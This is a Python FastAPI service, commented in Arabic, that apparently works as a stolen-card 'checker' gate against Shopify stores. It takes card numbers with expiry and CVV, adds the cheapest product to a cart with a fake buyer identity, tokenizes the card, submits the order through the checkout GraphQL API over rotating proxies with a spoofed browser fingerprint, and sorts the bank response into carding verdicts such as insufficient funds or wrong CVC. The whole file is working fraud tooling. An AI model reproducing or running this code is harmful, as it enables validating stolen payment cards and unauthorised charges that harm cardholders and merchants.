from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import uuid
import random
import asyncio

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    """تشفير الكلمات لحماية البروكسي"""
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    return {"Response": clean_msg, "Price": str(price).replace('$', ''), "Gate": gate}

async def get_cheapest_product(session, store_url):
    try:
        res = await session.get(f"{store_url}/products.json?limit=50", headers={"Accept": "application/json"})
        if res.status_code != 200: return None, "-"
        data = res.json()
        best_vid, lowest_price = None, float('inf')
        for prod in data.get('products', []):
            for var in prod.get('variants', []):
                if var.get('available'):
                    try:
                        p = float(var.get('price', 0))
                        if p > 10000: p = p / 100.0
                        if 0 < p < lowest_price: lowest_price, best_vid = p, var.get('id')
                    except: pass
        return str(best_vid) if best_vid else None, str(round(lowest_price, 2)) if best_vid else "-"
    except: return None, "-"

async def check_shopify_graphql(cc_info, store_url, proxy):
    try:
        # 1. تجهيز البطاقة
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify GraphQL")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        scope_host = store_url.replace("https://", "").replace("http://", "")
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # بيانات وهمية ثابتة كما في neww.py
        buyer = {
            "email": f"johndoe{random.randint(1000,9999)}@gmail.com", "first_name": "John", "last_name": "Doe",
            "address1": "4024 College Point Boulevard", "city": "Flushing", "province": "NY", "zip": "11354",
            "country": "US", "phone": "2494851515"
        }

        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            # 2. جلب المنتج
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id: return safe_response("No products in stock", "-", "Shopify GraphQL")

            # 3. الإضافة للسلة
            await session.post(f"{store_url}/cart/add.js", json={"id": variant_id, "quantity": 1})
            
            # 4. الدخول لصفحة الدفع لاستخراج التوكنات الحديثة
            res_chk = await session.get(f"{store_url}/checkout", allow_redirects=True)
            html_chk = res_chk.text
            final_url = str(res_chk.url)

            # استخراج Session Token (السر في neww.py)
            from html import unescape
            meta_match = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
            if not meta_match:
                # إذا لم يكن النظام الجديد مفعل، نعود للوراء
                return safe_response("Store does not use GraphQL Extensibility", price, "Shopify GraphQL")
            
            session_token = unescape(meta_match.group(1)).strip('"')
            
            # استخراج Checkout Token من الرابط
            if '/checkouts/cn/' in final_url:
                checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
            else:
                checkout_token_match = re.search(r'checkout_token"\s*:\s*"([^"]+)"', html_chk)
                checkout_token = checkout_token_match.group(1) if checkout_token_match else "unknown"

            # 5. تشفير البطاقة (PCI)
            card_payload = {
                "credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']},
                "payment_session_scope": scope_host
            }
            res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json=card_payload, headers={"Origin": "https://checkout.pci.shopifyinc.com"})
            if res_pci.status_code != 200: return safe_response("IP Blocked by Payment Gateway (Stripe)", price, "Shopify GraphQL")
            card_session_id = res_pci.json().get("id")

            if not card_session_id: return safe_response("Card Tokenization Failed", price, "Shopify GraphQL")

            # 6. إرسال Proposal (تهيئة الدفع)
            gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
            gql_headers = {
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                'x-checkout-web-source-id': checkout_token,
                'x-checkout-one-session-token': session_token,
            }
            merch_id = str(uuid.uuid4())
            addr_data = {"address1": buyer["address1"], "city": buyer["city"], "countryCode": buyer["country"], "firstName": buyer["first_name"], "lastName": buyer["last_name"], "zoneCode": buyer["province"], "postalCode": buyer["zip"], "phone": buyer["phone"]}
            
            prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken sellerProposal{checkoutTotal{...on MoneyValueConstraint{value{amount}}}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle}}}}}}}}}}}"""
            prop_vars = {
                "delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}},
                "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]},
                "sessionInput": {"sessionToken": session_token}
            }

            res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
            if res_prop.status_code != 200: return safe_response("GraphQL Proposal Failed", price, "Shopify GraphQL")
            
            prop_data = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            queue_token = prop_data.get('queueToken')
            
            if not queue_token: return safe_response("Failed to get Queue Token", price, "Shopify GraphQL")

            await asyncio.sleep(1.5) # مهلة بسيطة لعدم حظر الطلبات

            # 7. التنفيذ النهائي (SubmitForCompletion)
            submit_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
            submit_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitFailed{reason}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
            submit_vars = {
                "attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}",
                "input": {
                    "sessionInput": {"sessionToken": session_token}, "queueToken": queue_token,
                    "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True},
                    "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]},
                    "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}},
                    "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
                }
            }

            res_sub = await session.post(submit_url, json={"operationName": "SubmitForCompletion", "query": submit_query, "variables": submit_vars}, headers=gql_headers)
            if res_sub.status_code != 200: return safe_response("GraphQL Submit Failed", price, "Shopify GraphQL")
            
            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
            rtype = sub_data.get('__typename')
            
            if rtype == 'SubmitRejected':
                errs = sub_data.get('errors', [])
                msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'Rejected'
                return safe_response(msg, price, "Shopify GraphQL")
            
            receipt_id = sub_data.get('receipt', {}).get('id')
            if not receipt_id: return safe_response(f"Completion Failed: {rtype}", price, "Shopify GraphQL")

            # 8. فحص الاستجابة البنكية (PollForReceipt)
            poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
            poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}...on ActionRequiredReceipt{id}}}"""
            
            for _ in range(7): # فحص متكرر للنتيجة
                res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                if res_poll.status_code == 200:
                    poll_data = res_poll.json().get('data', {}).get('receipt', {})
                    p_type = poll_data.get('__typename')
                    
                    if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify GraphQL")
                    elif p_type == 'ActionRequiredReceipt': return safe_response("3D Secure Required", price, "Shopify GraphQL")
                    elif p_type == 'FailedReceipt':
                        err_code = poll_data.get('processingError', {}).get('code', 'DECLINED')
                        msg_untrans = poll_data.get('processingError', {}).get('messageUntranslated', '')
                        
                        if "INSUFFICIENT" in err_code: return safe_response("Insufficient Funds", price, "Shopify GraphQL")
                        elif "CVC" in err_code: return safe_response("Incorrect CVC", price, "Shopify GraphQL")
                        elif "ADDRESS" in err_code or "ZIP" in err_code: return safe_response("ZIP Code Mismatch", price, "Shopify GraphQL")
                        elif "DO_NOT_HONOR" in err_code: return safe_response("Do Not Honor", price, "Shopify GraphQL")
                        
                        return safe_response(msg_untrans if msg_untrans else err_code, price, "Shopify GraphQL")
                
                await asyncio.sleep(2)

            return safe_response("Timeout waiting for Receipt", price, "Shopify GraphQL")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify GraphQL")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify_graphql(cc, url, proxy)
    return JSONResponse(content=result)
